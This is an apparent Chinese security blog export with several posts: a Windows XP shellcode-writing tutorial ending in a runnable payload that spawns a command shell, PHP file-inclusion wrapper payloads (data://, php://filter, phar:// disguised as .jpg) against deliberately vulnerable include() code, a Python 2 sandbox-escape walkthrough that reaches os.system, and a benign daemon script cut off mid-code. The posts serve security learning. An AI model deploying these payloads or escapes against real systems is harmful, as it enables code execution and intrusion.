edi; push edi; push edi; mov byte ptr[ebp-0ch],63h; mov byte ptr[ebp-0bh],6fh; mov byte ptr[ebp-0ah],6dh; mov byte ptr[ebp-09h],6dh; mov byte ptr[ebp-08h],61h; mov byte ptr[ebp-07h],6eh; mov byte ptr[ebp-06h],64h; mov byte ptr[ebp-05h],2eh; mov byte ptr[ebp-04h],63h; mov byte ptr[ebp-03h],6fh; mov byte ptr[ebp-02h],6dh; lea eax, [ebp-0ch]; push eax; mov eax, 0x77c293c7; call eax; &#125; return 0;&#125; 有了上面的工作，提取ShellCode就只剩下体力活了。我们对刚才的全汇编的程序，按F10进入调试，接着按下Debug工具栏的Disassembly按钮，点右键，在弹出菜单中选中Code Bytes，就出现汇编对应的机器码。因为汇编可以完全完成我们的功能，所以我们把汇编对应的机器码原封不动抄下来，就得到我们想要的ShellCode了。 提取出来的ShellCode如下。 1234567891011unsigned char shellcode[] ="\x55\x8B\xEC\x33\xC0\x50\x50\x50""\xC6\x45\xF4\x6D\xC6\x45\xF5\x73\xC6\x45\xF6\x76\xC6\x45\xF7\x63""\xC6\x45\xF8\x72\xC6\x45\xF9\x74\xC6\x45\xFA\x2E\xC6\x45\xFB\x64\xC6\x45\xFC\x6C""\xC6\x45\xFD\x6C\x8D\x45\xF4\x50\xBA""\x7B\x1D\x80\x7C""\xFF\xD2\x55\x8B\xEC\x33\xFF\x57\x57\x57""\xC6\x45\xF4\x63\xC6\x45\xF5\x6F\xC6\x45\xF6\x6D\xC6\x45\xF7\x6D""\xC6\x45\xF8\x61\xC6\x45\xF9\x6E\xC6\x45\xFA\x64\xC6\x45\xFB\x2E""\xC6\x45\xFC\x63\xC6\x45\xFD\x6F\xC6\x45\xFE\x6D\x8D\x45\xF4\x50\xB8""\xC7\x93\xC2\x77""\xFF\xD0"; 最后要验证提取出来的ShellCode能否完成我们的功能。在以前的文章中已经说过方法，只需要新建一个工程和c源文件，然后把ShellCode部分拷下来，存为一个数组，最后在main中添上( (void(*)(void)) &amp;shellcode )()，如下： 1234567891011121314151617unsigned char shellcode[] ="\x55\x8B\xEC\x33\xC0\x50\x50\x50""\xC6\x45\xF4\x6D\xC6\x45\xF5\x73\xC6\x45\xF6\x76\xC6\x45\xF7\x63""\xC6\x45\xF8\x72\xC6\x45\xF9\x74\xC6\x45\xFA\x2E\xC6\x45\xFB\x64\xC6\x45\xFC\x6C""\xC6\x45\xFD\x6C\x8D\x45\xF4\x50\xBA""\x7B\x1D\x80\x7C""\xFF\xD2\x55\x8B\xEC\x33\xFF\x57\x57\x57""\xC6\x45\xF4\x63\xC6\x45\xF5\x6F\xC6\x45\xF6\x6D\xC6\x45\xF7\x6D""\xC6\x45\xF8\x61\xC6\x45\xF9\x6E\xC6\x45\xFA\x64\xC6\x45\xFB\x2E""\xC6\x45\xFC\x63\xC6\x45\xFD\x6F\xC6\x45\xFE\x6D\x8D\x45\xF4\x50\xB8""\xC7\x93\xC2\x77""\xFF\xD0";int main()&#123; ( (void(*)(void)) &amp;shellcode )(); return 0;&#125; ( (void(*)(void)) &amp;shellcode )()这句话是关键，它把ShellCode转换成一个参数为空，返回为空的函数指针，并调用它。执行那句就相当于执行ShellCode数组里的那些数 据。如果ShellCode正确，就会完成我们想要的功能，出现一个DOS窗口。我们亲自编写的第一个ShellCode成功完成！]]></content>
      <categories>
        <category>overflow</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>overflow</tag>
        <tag>xp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP文件包含以及部分封装协议]]></title>
    <url>%2F2016%2F10%2F31%2Fphp-RFI-LFI-protocol%2F</url>
    <content type="text"><![CDATA[概述最近总是遇到有关文件包含的问题，所以觉得有必要学习整理下有关这方面的内容。php支持的协议可以查阅官方手册。 123456789101112file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 这里顺便记一下有关php文件包含的函数： 12345678fopen()file_get_contents()curl_exec()readfile()require()require_once()include()include_once() PHP部分封装协议file 协议文件系统 是 PHP 使用的默认封装协议，展现了本地文件系统。 当指定了一个相对路径（不以/、\、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。 在很多情况下是脚本所在的目录，除非被修改了。 使用 CLI 的时候，目录默认是脚本被调用时所在的目录。 在某些函数里，例如 fopen() 和 file_get_contents()， include_path 会可选地搜索，也作为相对的路径。 123456789&lt;?php $gfile = $_GET['gfile'];if (isset($gfile))&#123; print_r(file_get_contents($gfile));&#125;else &#123; print_r("Please input gfile !&lt;br /&gt;");&#125;// ?gfile=file://C:\mySoft\xampp\htdocs\phpinfo.php// ?gfile=file://C:/mySoft/xampp/htdocs/phpinfo.php http、https 协议允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源(需要allow_url_fopen=On并且 allow_url_include=On)。 HTTP请求会附带一个Host:头，用于兼容基于域名的虚拟主机。如果在你的 php.ini 文件中或字节流上下文（context）配置了user_agent字符串，它也会被包含在请求之中。数据流允许读取资源的 body，而 headers 则储存在了 $http_response_header 变量里。如果需要知道文档资源来自哪个 URL（经过所有重定向的处理后）， 需要处理数据流返回的系列响应报头（response headers）。 example: 12345678&lt;?php$gfile = $_GET['gfile'];if (isset($gfile))&#123; readfile($gfile);&#125;else &#123; print_r("Please input gfile !&lt;br /&gt;");&#125;// ?gfile=http://www.example.com php 协议filterphp://filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用（需要allow_url_include=On）。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。 php://filter 参数 resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。 read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 example: 1234567891011&lt;?php$gfile = $_GET['gfile'];if (isset($gfile))&#123; readfile($gfile);&#125;else &#123; print_r("Please input gfile !&lt;br /&gt;");&#125;// ?gfile=php://filter/read=string.toupper/resource=http://www.example.com// ?gfile=php://filter/read=string.toupper|string.rot13/resource=http://www.example.com// ?gfile=php://filter/read=convert.base64-encode/resource/resource=http://www.example.com inputphp://input 是个可以访问请求的原始数据的只读流（需要allow_url_include=On）。POST 请求的情况下，最好使用 php://input 来代替 $HTTP_RAW_POST_DATA，因为它不依赖于特定的 php.ini 指令。而且，这样的情况下 $HTTP_RAW_POST_DATA 默认没有填充，比激活 always_populate_raw_post_data 潜在需要更少的内存。 enctype=”multipart/form-data”的时候 php://input 是无效的。 example: 123&lt;?php$content = file_get_contents("php://input");echo $content; //输出name=tom&amp;age=22 zlibzlib: PHP 4.0.4 - PHP 4.2.3（仅支持带 fopencookie 的系统）compress.zlib:// 和 compress.bzip2:// PHP 4.3.0 及以上 用法： compress.zlib://file.gz compress.bzip2://file.bz2 zip://archive.zip#dir/file.txt data自 PHP 5.2.0 起 data:（» RFC 2397）数据流封装器开始有效(需要allow_url_include=On)。 example :12345678910111213&lt;?php$gfile = $_GET['gfile'];if (isset($gfile))&#123; echo include($gfile);&#125;else &#123; print_r("Please input gfile !&lt;br /&gt;");&#125;// ?gfile=data://text/plain;base64,SSBsb3ZlIFBIUAo=// ?gfile=data://text/plain;charset=unicode,(●'◡'●)// ?gfile=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==// ?gfile=data://text/plain,&lt;?php phpinfo(); ?&gt; globglob:// — 查找匹配的文件路径模式。glob: 数据流包装器自 PHP 5.3.0 起开始有效，可绕过绕过open_basedir读写文件。 example : 12345678910111213&lt;?php$gfile = $_GET['gfile'];if (isset($gfile))&#123; $it = new DirectoryIterator($gfile); foreach($it as $f) &#123; printf("%s: %.1FK&lt;br /&gt;", $f-&gt;getFilename(), $f-&gt;getSize()/1024); &#125;&#125;else &#123; print_r("Please input gfile !&lt;br /&gt;");&#125;// ?gfile=glob://C:\mySoft\xampp\htdocs\*.php// ?gfile=glob://C:/mySoft/xampp/htdocs/*.php pharphar:// 数据流包装器自 PHP 5.3.0 起开始有效。PHP 归档。 123456789&lt;?php$gfile = $_GET['gfile'];if (isset($gfile))&#123; include($gfile);&#125;else &#123; print_r("Please input gfile !&lt;br /&gt;");&#125;// 把php代码写入phpinfo文件，然后压缩成zip，再改后缀为.jpg// ?gfile=phar://phpinfo.jpg/phpinfo 大概就先这样把，下次有问题再添加。]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>protocol</tag>
        <tag>php</tag>
        <tag>RFI</tag>
        <tag>LFI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python Sandbox Excape]]></title>
    <url>%2F2016%2F10%2F27%2Fpython-sandbox-excape%2F</url>
    <content type="text"><![CDATA[概述最近刚刚学习了Python Sandbox Excape，赶紧记录一下。 背景这是某个大牛的python沙盒逃逸实验的代码： 12345678910111213141516171819202122232425262728293031323334353637383940# -*- coding: utf-8 -*-# !/usr/bin/env pythonfrom __future__ import print_functionprint("Welcome to my Python sandbox! Enter commands below!")banned = [ "import", "exec", "eval", "pickle", "os", "subprocess", "kevin sucks", "input", "banned", "cry sum more", "sys"]targets = __builtins__.__dict__.keys()targets.remove('raw_input')targets.remove('print')for x in targets: # 去除所有内置函数除print raw_input del __builtins__.__dict__[x]while 1: print("&gt;&gt;&gt;", end=' ') data = raw_input() for no in banned: if no.lower() in data.lower(): print("No bueno") break else: # this means nobreak try: exec data except: print ("error !") 不能出现banned列表中的字符，但是需要读取flag文件内容。 方法file方法123456789&gt;&gt;&gt; [].__class__&lt;type 'list'&gt;&gt;&gt;&gt; &#123;&#125;.__class__&lt;type 'dict'&gt;&gt;&gt;&gt; ().__class__&lt;type 'tuple'&gt;&gt;&gt;&gt; &#123;&#125;.__class__.__base__&lt;type 'object'&gt; 发现__subclasses__()里有file： 12&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[&lt;type 'type'&gt;, &lt;type 'weakref'&gt;, &lt;type 'weakcallableproxy'&gt;, &lt;type 'weakproxy'&gt;, &lt;type 'int'&gt;, &lt;type 'basestring'&gt;, &lt;type 'bytearray'&gt;, &lt;type 'list'&gt;, &lt;type 'NoneType'&gt;, &lt;type 'NotImplementedType'&gt;, &lt;type 'traceback'&gt;, &lt;type 'super'&gt;, &lt;type 'xrange'&gt;, &lt;type 'dict'&gt;, &lt;type 'set'&gt;, &lt;type 'slice'&gt;, &lt;type 'staticmethod'&gt;, &lt;type 'complex'&gt;, &lt;type 'float'&gt;, &lt;type 'buffer'&gt;, &lt;type 'long'&gt;, &lt;type 'frozenset'&gt;, &lt;type 'property'&gt;, &lt;type 'memoryview'&gt;, &lt;type 'tuple'&gt;, &lt;type 'enumerate'&gt;, &lt;type 'reversed'&gt;, &lt;type 'code'&gt;, &lt;type 'frame'&gt;, &lt;type 'builtin_function_or_method'&gt;, &lt;type 'instancemethod'&gt;, &lt;type 'function'&gt;, &lt;type 'classobj'&gt;, &lt;type 'dictproxy'&gt;, &lt;type 'generator'&gt;, &lt;type 'getset_descriptor'&gt;, &lt;type 'wrapper_descriptor'&gt;, &lt;type 'instance'&gt;, &lt;type 'ellipsis'&gt;, &lt;type 'member_descriptor'&gt;, &lt;type 'file'&gt;, &lt;type 'PyCapsule'&gt;, &lt;type 'cell'&gt;, &lt;type 'callable-iterator'&gt;, &lt;type 'iterator'&gt;, &lt;type 'sys.long_info'&gt;, &lt;type 'sys.float_info'&gt;, &lt;type 'EncodingMap'&gt;, &lt;type 'fieldnameiterator'&gt;, &lt;type 'formatteriterator'&gt;, &lt;type 'sys.version_info'&gt;, &lt;type 'sys.flags'&gt;, &lt;type 'sys.getwindowsversion'&gt;, &lt;type 'exceptions.BaseException'&gt;, &lt;type 'module'&gt;, &lt;type 'imp.NullImporter'&gt;, &lt;type 'zipimport.zipimporter'&gt;, &lt;type 'nt.stat_result'&gt;, &lt;type 'nt.statvfs_result'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class '_abcoll.Hashable'&gt;, &lt;type 'classmethod'&gt;, &lt;class '_abcoll.Iterable'&gt;, &lt;class '_abcoll.Sized'&gt;, &lt;class '_abcoll.Container'&gt;, &lt;class '_abcoll.Callable'&gt;, &lt;class 'site._Printer'&gt;, &lt;class 'site._Helper'&gt;, &lt;type '_sre.SRE_Pattern'&gt;, &lt;type '_sre.SRE_Match'&gt;, &lt;type '_sre.SRE_Scanner'&gt;, &lt;class 'site.Quitter'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;type 'operator.itemgetter'&gt;, &lt;type 'operator.attrgetter'&gt;, &lt;type 'operator.methodcaller'&gt;, &lt;type 'functools.partial'&gt;, &lt;type 'MultibyteCodec'&gt;, &lt;type 'MultibyteIncrementalEncoder'&gt;, &lt;type 'MultibyteIncrementalDecoder'&gt;, &lt;type 'MultibyteStreamReader'&gt;, &lt;type 'MultibyteStreamWriter'&gt;] 12345678910111213&gt;&gt;&gt; ().__class__.__base__.__subclasses__().index(file)40&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[40]&lt;type 'file'&gt;&gt;&gt;&gt; f=().__class__.__base__.__subclasses__()[40]&gt;&gt;&gt; f('test.txt','r').read()'this is a test!'&gt;&gt;&gt; print (f('test.txt','r').read())this is a test! os模块system同样的还有一种方法就是使用os模块来执行系统命令system，但是os被屏蔽,先找到os 12345678910111213141516&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[60]&lt;class 'warnings.catch_warnings'&gt;&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[60].__init__.func_globals.keys()['filterwarnings', 'once_registry', 'WarningMessage', '_show_warning', 'filters', '_setoption', 'showwarning', '__all__', 'onceregistry', '__package__', 'simplefilter', 'default_action', '_getcategory', '__builtins__', 'catch_warnings', '__file__', 'warnpy3k', 'sys', '__name__', 'warn_explicit', 'types', 'warn', '_processoptions', 'defaultaction', '__doc__', 'linecache', '_OptionError', 'resetwarnings', 'formatwarning', '_getaction']&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[60].__init__.func_globals.keys().index('linecache')25&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[60].__init__.func_globals.keys()[25]'linecache'&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.keys()['updatecache', 'clearcache', '__all__', '__builtins__', '__file__', 'cache', 'checkcache', 'getline', '__package__', 'sys', 'getlines', '__name__', 'os', '__doc__']&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12]&lt;module 'os' from 'C:\mySoft\python2.7.9\lib\os.pyc'&gt; 然后找system 12345678910111213141516171819&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12].__dict__.keys().index('system')79&gt;&gt;&gt; a=[].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12]&gt;&gt;&gt; a&lt;module 'os' from 'C:\mySoft\python2.7.9\lib\os.pyc'&gt;&gt;&gt;&gt; s=a.__dict__.keys()&gt;&gt;&gt; s['lseek', 'O_SEQUENTIAL', 'pathsep', 'execle', '_Environ', 'kill', 'urandom', 'execlp', 'startfile', 'umask', 'linesep', 'getpid', 'spawnve', 'devnull', 'fstat', 'getenv', 'O_CREAT', 'dup2', 'read', '__file__', 'P_OVERLAY', 'O_RDONLY', 'TMP_MAX', 'utime', 'execl', 'F_OK', '_make_stat_result', 'name', 'fsync', 'remove', 'P_NOWAITO', '_copy_reg', 'execv', 'execlpe', 'pardir', 'tempnam', 'tmpfile', 'sep', 'popen4', 'defpath', 'popen2', 'stat', 'O_APPEND', 'altsep', 'close', '_exists', '__all__', 'makedirs', 'getcwdu', 'access', 'UserDict', 'O_RDWR', 'P_WAIT', 'stat_result', 'lstat', '__builtins__', 'O_TEMPORARY', 'walk', 'getcwd', 'stat_float_times', '__name__', 'O_TRUNC', 'O_TEXT', 'SEEK_END', 'popen', 'times', 'P_NOWAIT', 'removedirs', '_pickle_statvfs_result', '_exit', '_get_exports_list', 'chmod', 'SEEK_CUR', 'path', 'open', 'putenv', 'fdopen', 'errno', 'mkdir', 'system', '_execvpe', 'rmdir', 'O_WRONLY', 'dup', 'O_NOINHERIT', '__doc__', 'curdir', 'isatty', 'execvpe', 'closerange', 'execvp', 'popen3', 'X_OK', 'O_SHORT_LIVED', 'execve', 'chdir', 'strerror', 'R_OK', 'error', 'extsep', 'rename', 'P_DETACH', 'W_OK', 'abort', 'statvfs_result', 'spawnl', 'tmpnam', '__package__', 'write', 'waitpid', 'spawnv', 'listdir', '_pickle_stat_result', 'unsetenv', 'SEEK_SET', 'spawnle', 'sys', 'O_RANDOM', 'unlink', 'O_BINARY', '_make_statvfs_result', 'O_EXCL', 'pipe', 'environ', 'renames']&gt;&gt;&gt; s=a.__dict__.keys().index('system')&gt;&gt;&gt; s79&gt;&gt;&gt; s=a.__dict__.keys()[79]&gt;&gt;&gt; s'system' 读取文件 123456789101112131415&gt;&gt;&gt; s=a.__dict__.values()[79]&gt;&gt;&gt; s&lt;built-in function system&gt;&gt;&gt;&gt; s('dir') 驱动器 C 中的卷是 WIN 7 卷的序列号是 28DD-3D6F C:\Users\Administrator\Desktop 的目录2016/10/24 周一 上午 10:19 &lt;DIR&gt; .2016/10/24 周一 上午 10:19 &lt;DIR&gt; ..2016/10/24 周一 上午 10:19 15 test.txt&gt;&gt;&gt; s('type test.txt')this is a test!0 或者像下面一样： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&gt;&gt;&gt; print (().__class__)&lt;type 'tuple'&gt;&gt;&gt;&gt; print (().__class__.__base__)&lt;type 'object'&gt;&gt;&gt;&gt; print (().__class__.__base__.__subclasses__)&lt;built-in method __subclasses__ of type object at 0x1E229708&gt;&gt;&gt;&gt; print (().__class__.__base__.__subclasses__())[&lt;type 'type'&gt;, &lt;type 'weakref'&gt;, &lt;type 'weakcallableproxy'&gt;, &lt;type 'weakproxy'&gt;, &lt;type 'int'&gt;, &lt;type 'basestring'&gt;, &lt;type 'bytearray'&gt;, &lt;type 'list'&gt;, &lt;type 'NoneType'&gt;, &lt;type 'NotImplementedType'&gt;, &lt;type 'traceback'&gt;, &lt;type 'super'&gt;, &lt;type 'xrange'&gt;, &lt;type 'dict'&gt;, &lt;type 'set'&gt;, &lt;type 'slice'&gt;, &lt;type 'staticmethod'&gt;, &lt;type 'complex'&gt;, &lt;type 'float'&gt;, &lt;type 'buffer'&gt;, &lt;type 'long'&gt;, &lt;type 'frozenset'&gt;, &lt;type 'property'&gt;, &lt;type 'memoryview'&gt;, &lt;type 'tuple'&gt;, &lt;type 'enumerate'&gt;, &lt;type 'reversed'&gt;, &lt;type 'code'&gt;, &lt;type 'frame'&gt;, &lt;type 'builtin_function_or_method'&gt;, &lt;type 'instancemethod'&gt;, &lt;type 'function'&gt;, &lt;type 'classobj'&gt;, &lt;type 'dictproxy'&gt;, &lt;type 'generator'&gt;, &lt;type 'getset_descriptor'&gt;, &lt;type 'wrapper_descriptor'&gt;, &lt;type 'instance'&gt;, &lt;type 'ellipsis'&gt;, &lt;type 'member_descriptor'&gt;, &lt;type 'file'&gt;, &lt;type 'PyCapsule'&gt;, &lt;type 'cell'&gt;, &lt;type 'callable-iterator'&gt;, &lt;type 'iterator'&gt;, &lt;type 'sys.long_info'&gt;, &lt;type 'sys.float_info'&gt;, &lt;type 'EncodingMap'&gt;, &lt;type 'fieldnameiterator'&gt;, &lt;type 'formatteriterator'&gt;, &lt;type 'sys.version_info'&gt;, &lt;type 'sys.flags'&gt;, &lt;type 'sys.getwindowsversion'&gt;, &lt;type 'exceptions.BaseException'&gt;, &lt;type 'module'&gt;, &lt;type 'imp.NullImporter'&gt;, &lt;type 'zipimport.zipimporter'&gt;, &lt;type 'nt.stat_result'&gt;, &lt;type 'nt.statvfs_result'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class '_abcoll.Hashable'&gt;, &lt;type 'classmethod'&gt;, &lt;class '_abcoll.Iterable'&gt;, &lt;class '_abcoll.Sized'&gt;, &lt;class '_abcoll.Container'&gt;, &lt;class '_abcoll.Callable'&gt;, &lt;class 'site._Printer'&gt;, &lt;class 'site._Helper'&gt;, &lt;type '_sre.SRE_Pattern'&gt;, &lt;type '_sre.SRE_Match'&gt;, &lt;type '_sre.SRE_Scanner'&gt;, &lt;class 'site.Quitter'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;type 'operator.itemgetter'&gt;, &lt;type 'operator.attrgetter'&gt;, &lt;type 'operator.methodcaller'&gt;, &lt;type 'functools.partial'&gt;, &lt;type 'MultibyteCodec'&gt;, &lt;type 'MultibyteIncrementalEncoder'&gt;, &lt;type 'MultibyteIncrementalDecoder'&gt;, &lt;type 'MultibyteStreamReader'&gt;, &lt;type 'MultibyteStreamWriter'&gt;]&gt;&gt;&gt; print (().__class__.__base__.__subclasses__()[60])&lt;class 'warnings.catch_warnings'&gt;&gt;&gt;&gt; print (().__class__.__base__.__subclasses__()[60].__init__.func_globals.keys())['filterwarnings', 'once_registry', 'WarningMessage', '_show_warning', 'filters', '_setoption', 'showwarning', '__all__', 'onceregistry', '__package__', 'simplefilter', 'default_action', '_getcategory', '__builtins__', 'catch_warnings', '__file__', 'warnpy3k', 'sys', '__name__', 'warn_explicit', 'types', 'warn', '_processoptions', 'defaultaction', '__doc__', 'linecache', '_OptionError', 'resetwarnings', 'formatwarning', '_getaction']&gt;&gt;&gt; print (().__class__.__base__.__subclasses__()[60].__init__.func_globals.keys()[25])linecache&gt;&gt;&gt; print ([].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'])&lt;module 'linecache' from 'C:\mySoft\python2.7.9\lib\linecache.pyc'&gt;&gt;&gt;&gt; print ([].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.keys())['updatecache', 'clearcache', '__all__', '__builtins__', '__file__', 'cache', 'checkcache', 'getline', '__package__', 'sys', 'getlines', '__name__', 'os', '__doc__']&gt;&gt;&gt; print ([].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.keys()[12])os&gt;&gt;&gt; print ([].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12])&lt;module 'os' from 'C:\mySoft\python2.7.9\lib\os.pyc'&gt;&gt;&gt;&gt; print ([].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12].__dict__.keys())['lseek', 'O_SEQUENTIAL', 'pathsep', 'execle', '_Environ', 'kill', 'urandom', 'execlp', 'startfile', 'umask', 'linesep', 'getpid', 'spawnve', 'devnull', 'fstat', 'getenv', 'O_CREAT', 'dup2', 'read', '__file__', 'P_OVERLAY', 'O_RDONLY', 'TMP_MAX', 'utime', 'execl', 'F_OK', '_make_stat_result', 'name', 'fsync', 'remove', 'P_NOWAITO', '_copy_reg', 'execv', 'execlpe', 'pardir', 'tempnam', 'tmpfile', 'sep', 'popen4', 'defpath', 'popen2', 'stat', 'O_APPEND', 'altsep', 'close', '_exists', '__all__', 'makedirs', 'getcwdu', 'access', 'UserDict', 'O_RDWR', 'P_WAIT', 'stat_result', 'lstat', '__builtins__', 'O_TEMPORARY', 'walk', 'getcwd', 'stat_float_times', '__name__', 'O_TRUNC', 'O_TEXT', 'SEEK_END', 'popen', 'times', 'P_NOWAIT', 'removedirs', '_pickle_statvfs_result', '_exit', '_get_exports_list', 'chmod', 'SEEK_CUR', 'path', 'open', 'putenv', 'fdopen', 'errno', 'mkdir', 'system', '_execvpe', 'rmdir', 'O_WRONLY', 'dup', 'O_NOINHERIT', '__doc__', 'curdir', 'isatty', 'execvpe', 'closerange', 'execvp', 'popen3', 'X_OK', 'O_SHORT_LIVED', 'execve', 'chdir', 'strerror', 'R_OK', 'error', 'extsep', 'rename', 'P_DETACH', 'W_OK', 'abort', 'statvfs_result', 'spawnl', 'tmpnam', '__package__', 'write', 'waitpid', 'spawnv', 'listdir', '_pickle_stat_result', 'unsetenv', 'SEEK_SET', 'spawnle', 'sys', 'O_RANDOM', 'unlink', 'O_BINARY', '_make_statvfs_result', 'O_EXCL', 'pipe', 'environ', 'renames']&gt;&gt;&gt; print ([].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12].__dict__.keys()[79])system&gt;&gt;&gt; print ([].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12].__dict__.values()[79]('type test.txt'))this is a test!0 当然，还有很多方式]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>code execution</tag>
        <tag>python</tag>
        <tag>excape</tag>
        <tag>sandbox</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python 版的守护进程和Windows服务]]></title>
    <url>%2F2016%2F10%2F22%2Fpython-linux-daemon-windows-service%2F</url>
    <content type="text"><![CDATA[概述最近在写python脚本时需要用到Linux的守护进程以及Windows下的服务进程。百度了挺多，都记下来，以后如果再次遇到这种问题就不用去找了。 Linux守护进程最重要的特性是后台运行；它必须与其运行前的环境隔离开来，这些环境包括未关闭的文件描述符、控制终端、会话和进程组、工作目录以及文件创建掩码等；它可以在系统启动时从启动脚本/etc/rc.d中启动，可以由inetd守护进程启动，也可以有作业规划进程crond启动，还可以由用户终端（通常是shell）执行。Python有时需要保证只运行一个脚本实例，以避免数据的冲突。详细参考大神文章 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155#!/usr/bin/env python# -*- coding: utf-8 -*-''' 增加守护进程（linux）'''import osimport datetimeimport timeimport sysimport atexitimport string import subprocessfrom signal import SIGTERM from lib.function import confdealclass Daemon: #需要获取调试信息，改为stdin='/dev/stdin', stdout='/dev/stdout', stderr='/dev/stderr'，以root身份运行。 def __init__(self, scriptPath,pidfile, stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'): self.stdin = stdin self.stdout = stdout self.stderr = stderr self.pidfile = pidfile self.scriptPath = scriptPath def _daemonize(self): try: pid = os.fork() #第一次fork，生成子进程，脱离父进程 if pid &gt; 0: sys.exit(0) #退出主进程 except OSError, e: sys.stderr.write('fork #1 failed: %d (%s)\n' % (e.errno, e.strerror)) sys.exit(1) os.chdir("/") #修改工作目录 os.setsid() #设置新的会话连接 os.umask(0) #重新设置文件创建权限 try: pid = os.fork() #第二次fork，禁止进程打开终端 if pid &gt; 0: sys.exit(0) except OSError, e: sys.stderr.write('fork #2 failed: %d (%s)\n' % (e.errno, e.strerror)) sys.exit(1) #重定向文件描述符 sys.stdout.flush() sys.stderr.flush() si = file(self.stdin, 'r') so = file(self.stdout, 'a+') se = file(self.stderr, 'a+', 0) os.dup2(si.fileno(), sys.stdin.fileno()) os.dup2(so.fileno(), sys.stdout.fileno()) os.dup2(se.fileno(), sys.stderr.fileno()) #注册退出函数，根据文件pid判断是否存在进程 atexit.register(self.delpid) pid = str(os.getpid()) file(self.pidfile,'w+').write('%s\n' % pid) def delpid(self): os.remove(self.pidfile) def start(self): #检查pid文件是否存在以探测是否存在进程 try: pf = file(self.pidfile,'r') pid = int(pf.read().strip()) pf.close() except IOError: pid = None if pid: message = 'pidfile %s already exist. Daemon already running!\n' sys.stderr.write(message % self.pidfile) sys.exit(1) #启动监控 self._daemonize() self._run() def stop(self): #从pid文件中获取pid try: pf = file(self.pidfile,'r') pid = int(pf.read().strip()) pf.close() except IOError: pid = None if not pid: #重启不报错 message = 'pidfile %s does not exist. Daemon not running!\n' sys.stderr.write(message % self.pidfile) return #杀进程 # 我的程序需要，只是获取端口号 remoteDic = confdeal.getConfRemote(self.scriptPath) if remoteDic: # 根据端口号杀掉子进程 ret = os.popen('netstat -antup | grep \":'+str(remoteDic['localPort'])+' \"') strList = list(set(ret.read().split('\n'))) for pidStr in strList: if pidStr != '': pidStr = pidStr.split('/')[0] pidStr = pidStr[pidStr.rfind(' ')+1:] os.system("kill "+pidStr) try: while 1: os.kill(pid, SIGTERM) time.sleep(0.1) #os.system('hadoop-daemon.sh stop datanode') #os.system('hadoop-daemon.sh stop tasktracker') #os.remove(self.pidfile) except OSError, err: err = str(err) if err.find('No such process') &gt; 0: if os.path.exists(self.pidfile): os.remove(self.pidfile) else: print str(err) sys.exit(1) def restart(self): self.stop() self.start() def _run(self): # 开启子进程 cmd = 'cd ' + self.scriptPath +' &amp;&amp; python test.py' child = subprocess.Popen(cmd, shell=True) while 1: if child.poll()==1: child = subprocess.Popen(cmd, shell=True) time.sleep(10)if __name__ == '__main__': scriptPath = os.path.dirname(os.path.realpath(__file__)) daemon = Daemon(scriptPath,'/tmp/watch_process.pid', stdout = '/tmp/watch_stdout.log') if len(sys.argv) == 2: if 'start' == sys.argv[1]: daemon.start() elif 'stop' == sys.argv[1]: daemon.stop() elif 'restart' == sys.argv[1]: 